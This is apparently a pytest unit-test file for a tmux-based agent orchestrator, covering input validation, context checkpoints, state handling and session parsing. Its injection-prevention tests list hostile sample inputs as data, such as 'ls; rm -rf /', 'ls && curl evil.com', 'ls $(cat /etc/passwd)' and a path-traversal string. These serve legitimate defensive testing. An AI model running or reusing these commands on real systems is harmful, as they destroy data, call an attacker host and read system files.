#!/usr/bin/env python3
"""
Unit tests for core Tmux-Orchestrator functions
Priority: Basic unit tests for core functions
"""

import pytest
import json
from unittest.mock import Mock, patch, MagicMock
from pathlib import Path

from security_validator import SecurityValidator
from context_registry import ContextCheckpoint, ContextState, ContextRegistry
from tmux_utils import TmuxOrchestrator, TmuxWindow, TmuxSession


class TestSecurityValidator:
    """Unit tests for SecurityValidator - Critical for production safety"""
    
    @pytest.mark.unit
    def test_validate_session_name_valid(self):
        """Test valid session names pass validation"""
        valid_names = ['test-session', 'session_1', 'validSession123', 'a', 'simple']
        
        for name in valid_names:
            valid, error = SecurityValidator.validate_session_name(name)
            assert valid is True, f"Valid name '{name}' should pass"
            assert error is None
    
    @pytest.mark.unit
    def test_validate_session_name_invalid(self):
        """Test invalid session names fail validation"""
        invalid_cases = [
            ('', 'empty string'),
            ('session with spaces', 'contains spaces'),
            ('session;injection', 'contains semicolon'),
            ('x' * 60, 'too long'),
            ('session$special', 'special characters'),
            ('../../etc/passwd', 'path traversal')
        ]
        
        for name, reason in invalid_cases:
            valid, error = SecurityValidator.validate_session_name(name)
            assert valid is False, f"Invalid name '{name}' should fail ({reason})"
            assert error is not None
    
    @pytest.mark.unit
    def test_validate_window_index_valid(self):
        """Test valid window indices"""
        valid_indices = ['0', '1', '99', '123']
        
        for index in valid_indices:
            valid, error = SecurityValidator.validate_window_index(index)
            assert valid is True, f"Valid index '{index}' should pass"
            assert error is None
    
    @pytest.mark.unit
    def test_validate_window_index_invalid(self):
        """Test invalid window indices"""
        invalid_indices = ['', '-1', 'abc', '1000', 'NaN', '1.5']
        
        for index in invalid_indices:
            valid, error = SecurityValidator.validate_window_index(index)
            assert valid is False, f"Invalid index '{index}' should fail"
            assert error is not None
    
    @pytest.mark.unit
    @pytest.mark.security
    def test_sanitize_command_basic(self):
        """Test basic command sanitization"""
        test_cases = [
            'ls -la',
            'git status',
            'echo "hello world"',
            'python3 script.py'
        ]
        
        for command in test_cases:
            sanitized = SecurityValidator.sanitize_command(command)
            assert sanitized is not None
            assert len(sanitized) > 0
            # Should be properly quoted
            assert sanitized.startswith("'") or '"' in sanitized
    
    @pytest.mark.unit
    @pytest.mark.security
    def test_sanitize_command_injection_prevention(self):
        """Test command injection prevention"""
        malicious_commands = [
            'ls; rm -rf /',
            'ls && curl evil.com',
            'ls $(cat /etc/passwd)',
            'ls `rm -rf /`'
        ]
        
        for command in malicious_commands:
            sanitized = SecurityValidator.sanitize_command(command)
            # Should be properly escaped/quoted
            assert ';' not in sanitized or sanitized.startswith("'")
            assert '&&' not in sanitized or sanitized.startswith("'")
            assert '$(' not in sanitized or sanitized.startswith("'")
    
    @pytest.mark.unit
    def test_sanitize_command_length_limit(self):
        """Test command length limits"""
        long_command = 'x' * 2000  # Exceeds MAX_COMMAND_LENGTH
        
        with pytest.raises(ValueError):
            SecurityValidator.sanitize_command(long_command)
    
    @pytest.mark.unit
    def test_sanitize_message_basic(self):
        """Test message sanitization"""
        messages = [
            'Hello, agent!',
            'Complete task X',
            'Status: working on feature Y'
        ]
        
        for message in messages:
            sanitized = SecurityValidator.sanitize_message(message)
            assert sanitized is not None
            assert len(sanitized) > 0


class TestContextCheckpoint:
    """Unit tests for ContextCheckpoint - Foundation of context system"""
    
    @pytest.mark.unit
    def test_checkpoint_creation(self, sample_context_data):
        """Test basic checkpoint creation"""
        checkpoint = ContextCheckpoint.create(
            agent_id='test:0',
            session_name='test',
            window_index=0,
            context_data=sample_context_data
        )
        
        assert checkpoint.id is not None
        assert len(checkpoint.id) == 36  # UUID length
        assert checkpoint.agent_id == 'test:0'
        assert checkpoint.session_name == 'test'
        assert checkpoint.window_index == 0
        assert checkpoint.context_version == '3.0'
        assert checkpoint.context_data == sample_context_data
        assert checkpoint.parent_checkpoint_id is None
    
    @pytest.mark.unit
    def test_checkpoint_immutability(self, sample_context_data):
        """Test that checkpoints are immutable"""
        checkpoint = ContextCheckpoint.create(
            agent_id='immutable:0',
            session_name='immutable',
            window_index=0,
            context_data=sample_context_data
        )
        
        # Should not be able to modify fields
        with pytest.raises(AttributeError):
            checkpoint.agent_id = 'modified'
        
        with pytest.raises(AttributeError):
            checkpoint.context_data = {}
    
    @pytest.mark.unit
    def test_checkpoint_integrity_verification(self, sample_context_data):
        """Test cryptographic integrity verification"""
        checkpoint = ContextCheckpoint.create(
            agent_id='integrity:0',
            session_name='integrity',
            window_index=0,
            context_data=sample_context_data
        )
        
        # Should verify correctly
        assert checkpoint.verify_integrity() is True
        
        # Create checkpoint with corrupted hash
        corrupted = ContextCheckpoint(
            id=checkpoint.id,
            agent_id=checkpoint.agent_id,
            session_name=checkpoint.session_name,
            window_index=checkpoint.window_index,
            timestamp=checkpoint.timestamp,
            context_version=checkpoint.context_version,
            context_hash='corrupted_hash',
            context_data=checkpoint.context_data
        )
        
        # Should fail verification
        assert corrupted.verify_integrity() is False
    
    @pytest.mark.unit
    def test_checkpoint_with_parent(self, sample_context_data):
        """Test checkpoint parent-child relationships"""
        # Create parent checkpoint
        parent = ContextCheckpoint.create(
            agent_id='parent:0',
            session_name='parent',
            window_index=0,
            context_data={'phase': 'initial'}
        )
        
        # Create child checkpoint
        child = ContextCheckpoint.create(
            agent_id='parent:0',
            session_name='parent',
            window_index=0,
            context_data={'phase': 'updated'},
            parent_id=parent.id
        )
        
        assert child.parent_checkpoint_id == parent.id
        assert child.id != parent.id


class TestContextState:
    """Unit tests for ContextState - Mutable agent state"""
    
    @pytest.mark.unit
    def test_state_creation(self):
        """Test context state creation"""
        state = ContextState(agent_id='test:0')
        
        assert state.agent_id == 'test:0'
        assert state.message_count == 0
        assert state.tools_available == []
        assert state.metadata == {}
        assert state.current_task is None
    
    @pytest.mark.unit
    def test_state_mutation(self):
        """Test state modification"""
        state = ContextState(agent_id='mutable:0')
        
        # Test field updates
        state.current_task = 'new_task'
        state.message_count = 5
        state.working_directory = '/new/path'
        state.tools_available.append('new_tool')
        state.metadata['custom'] = 'value'
        
        assert state.current_task == 'new_task'
        assert state.message_count == 5
        assert state.working_directory == '/new/path'
        assert 'new_tool' in state.tools_available
        assert state.metadata['custom'] == 'value'
    
    @pytest.mark.unit
    def test_state_serialization(self):
        """Test state to/from dict conversion"""
        original_state = ContextState(
            agent_id='serial:0',
            current_task='serialization_test',
            tools_available=['tool1', 'tool2'],
            metadata={'key': 'value'}
        )
        
        # Serialize to dict
        state_dict = original_state.to_dict()
        assert isinstance(state_dict, dict)
        assert state_dict['agent_id'] == 'serial:0'
        assert state_dict['current_task'] == 'serialization_test'
        
        # Deserialize from dict
        restored_state = ContextState.from_dict(state_dict)
        assert restored_state.agent_id == original_state.agent_id
        assert restored_state.current_task == original_state.current_task
        assert restored_state.tools_available == original_state.tools_available
        assert restored_state.metadata == original_state.metadata


class TestTmuxDataStructures:
    """Unit tests for Tmux data structures"""
    
    @pytest.mark.unit
    def test_tmux_window_creation(self):
        """Test TmuxWindow data structure"""
        window = TmuxWindow(
            session_name='test',
            window_index=1,
            window_name='alex',
            active=True
        )
        
        assert window.session_name == 'test'
        assert window.window_index == 1
        assert window.window_name == 'alex'
        assert window.active is True
    
    @pytest.mark.unit
    def test_tmux_session_creation(self):
        """Test TmuxSession data structure"""
        windows = [
            TmuxWindow('test', 0, 'orchestrator', True),
            TmuxWindow('test', 1, 'alex', False)
        ]
        
        session = TmuxSession(
            name='test',
            windows=windows,
            attached=True
        )
        
        assert session.name == 'test'
        assert len(session.windows) == 2
        assert session.attached is True
        assert session.windows[0].active is True
        assert session.windows[1].active is False


class TestTmuxOrchestratorCore:
    """Unit tests for core TmuxOrchestrator functionality"""
    
    @pytest.mark.unit
    def test_orchestrator_initialization(self):
        """Test orchestrator initialization"""
        # Without context registry
        orchestrator = TmuxOrchestrator(enable_context_registry=False)
        assert orchestrator.context_registry is None
        assert orchestrator.safety_mode is True
        assert orchestrator.max_lines_capture == 1000
        
        # With context registry
        orchestrator_with_context = TmuxOrchestrator(enable_context_registry=True)
        assert orchestrator_with_context.context_registry is not None
    
    @pytest.mark.unit
    @patch('subprocess.run')
    def test_capture_window_content_validation(self, mock_subprocess):
        """Test window content capture with input validation"""
        orchestrator = TmuxOrchestrator(enable_context_registry=False)
        
        # Mock successful subprocess call
        mock_subprocess.return_value = Mock(
            stdout='mocked window content',
            returncode=0
        )
        
        # Test valid inputs
        result = orchestrator.capture_window_content('valid-session', 0)
        assert result == 'mocked window content'
        
        # Test invalid session name
        result = orchestrator.capture_window_content('invalid session', 0)
        assert 'Error:' in result
        
        # Test invalid window index
        result = orchestrator.capture_window_content('valid-session', -1)
        assert 'Error:' in result
    
    @pytest.mark.unit
    @patch('subprocess.run')
    def test_send_keys_validation(self, mock_subprocess):
        """Test send keys with validation"""
        orchestrator = TmuxOrchestrator(enable_context_registry=False)
        orchestrator.safety_mode = False  # Disable confirmation prompts
        
        # Mock successful subprocess call
        mock_subprocess.return_value = Mock(returncode=0)
        
        # Test valid inputs
        result = orchestrator.send_keys_to_window('valid-session', 0, 'test message', confirm=False)
        assert result is True
        
        # Test invalid session name
        result = orchestrator.send_keys_to_window('invalid session', 0, 'test', confirm=False)
        assert result is False
        
        # Test invalid window index
        result = orchestrator.send_keys_to_window('valid-session', -1, 'test', confirm=False)
        assert result is False
    
    @pytest.mark.unit
    @patch('subprocess.run')
    def test_get_tmux_sessions_parsing(self, mock_subprocess):
        """Test tmux session parsing"""
        orchestrator = TmuxOrchestrator(enable_context_registry=False)
        
        # Mock subprocess responses
        def mock_run(*args, **kwargs):
            cmd = args[0]
            if 'list-sessions' in cmd:
                return Mock(
                    stdout='test-session:1\nother-session:0\n',
                    returncode=0
                )
            elif 'list-windows' in cmd:
                if 'test-session' in cmd:
                    return Mock(
                        stdout='0:orchestrator:1\n1:alex:0\n',
                        returncode=0
                    )
                else:
                    return Mock(
                        stdout='0:main:1\n',
                        returncode=0
                    )
        
        mock_subprocess.side_effect = mock_run
        
        # Test parsing
        sessions = orchestrator.get_tmux_sessions()
        assert len(sessions) == 2
        
        test_session = next(s for s in sessions if s.name == 'test-session')
        assert test_session.attached is True
        assert len(test_session.windows) == 2
        assert test_session.windows[0].window_name == 'orchestrator'
        assert test_session.windows[0].active is True
        assert test_session.windows[1].window_name == 'alex'
        assert test_session.windows[1].active is False
    
    @pytest.mark.unit
    def test_find_window_by_name(self, mock_tmux_sessions):
        """Test finding windows by name"""
        orchestrator = TmuxOrchestrator(enable_context_registry=False)
        
        with patch.object(orchestrator, 'get_tmux_sessions', return_value=mock_tmux_sessions):
            # Find exact match
            matches = orchestrator.find_window_by_name('alex')
            assert len(matches) == 1
            assert matches[0] == ('test_session', 1)
            
            # Find partial match
            matches = orchestrator.find_window_by_name('orch')
            assert len(matches) == 1
            assert matches[0] == ('test_session', 0)
            
            # No matches
            matches = orchestrator.find_window_by_name('nonexistent')
            assert len(matches) == 0


class TestContextRegistry:
    """Unit tests for ContextRegistry core functionality"""
    
    @pytest.mark.unit
    def test_registry_initialization(self, temp_dir):
        """Test registry initialization"""
        registry = ContextRegistry(storage_dir=temp_dir)
        
        assert registry.storage_dir.exists()
        assert (registry.storage_dir / 'context.db').exists()
        assert isinstance(registry.active_states, dict)
        assert registry.store is not None
    
    @pytest.mark.unit
    def test_agent_key_generation(self, mock_context_registry):
        """Test consistent agent key generation"""
        key1 = mock_context_registry.get_agent_key('session', 0)
        key2 = mock_context_registry.get_agent_key('session', 0)
        key3 = mock_context_registry.get_agent_key('session', 1)
        
        assert key1 == key2  # Same inputs should produce same key
        assert key1 != key3  # Different inputs should produce different keys
        assert key1 == 'session:0'
    
    @pytest.mark.unit
    def test_state_management(self, mock_context_registry):
        """Test active state management"""
        # Update state
        mock_context_registry.update_state(
            'test_session', 0,
            current_task='test_task',
            custom_field='custom_value'
        )
        
        # Retrieve state
        state = mock_context_registry.get_state('test_session', 0)
        assert state.current_task == 'test_task'
        assert state.metadata['custom_field'] == 'custom_value'
        
        # State should persist between calls
        state2 = mock_context_registry.get_state('test_session', 0)
        assert state2.current_task == 'test_task'
    
    @pytest.mark.unit
    def test_checkpoint_threshold_logic(self, mock_context_registry):
        """Test checkpoint creation threshold"""
        # Should not need checkpoint initially
        assert mock_context_registry.should_create_checkpoint('threshold', 0, threshold=5) is False
        
        # Simulate message activity
        state = mock_context_registry.get_state('threshold', 0)
        state.message_count = 6
        
        # Should need checkpoint now
        assert mock_context_registry.should_create_checkpoint('threshold', 0, threshold=5) is True
    
    @pytest.mark.unit
    def test_create_checkpoint_basic(self, mock_context_registry, sample_context_data):
        """Test basic checkpoint creation"""
        checkpoint_id = mock_context_registry.create_checkpoint(
            'test_session', 0, sample_context_data
        )
        
        assert checkpoint_id is not None
        assert len(checkpoint_id) == 36  # UUID length
        
        # Verify state was updated
        state = mock_context_registry.get_state('test_session', 0)
        assert state.last_checkpoint_id == checkpoint_id
        assert state.message_count == 1


if __name__ == '__main__':
    pytest.main([__file__, '-v'])